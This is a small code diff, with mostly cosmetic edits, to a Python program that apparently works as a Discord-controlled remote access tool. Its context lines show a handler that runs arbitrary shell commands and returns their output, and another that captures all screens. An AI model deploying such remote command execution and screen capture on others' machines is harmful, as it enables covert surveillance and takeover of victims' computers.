@@ -29,7 +29,7 @@ def filetowav(ofn):
     x = AudioSegment.from_file(ofn)
     x.export(wfn, format='wav') 
     
-pyautogui.PAUSE = 0.25
+pyautogui.PAUSE = 0.2
 
 formatted_now = datetime.now().strftime("%d-%m-%Y %Y-%M-%S")
 
@@ -181,8 +181,8 @@ def exec_command(command):
     :return: A tuple of the stdout and stderr of the command.
     """
 
-    exec = subprocess.run(command, capture_output=True, text=True, shell=True)
-    return (exec.stdout, exec.stderr)
+    executed = subprocess.run(command, capture_output=True, text=True, shell=True)
+    return (executed.stdout, executed.stderr)
 
 
 async def dump(client, message: discord.Message, args: str):
@@ -222,6 +222,7 @@ async def screenshot(client, message: discord.Message, args: str):
     :param args: str = The arguments passed to the command
     :type args: str
     """
+    
     img = ImageGrab.grab(all_screens=True)
     byteio = BytesIO()
     img.save(byteio, format="PNG")
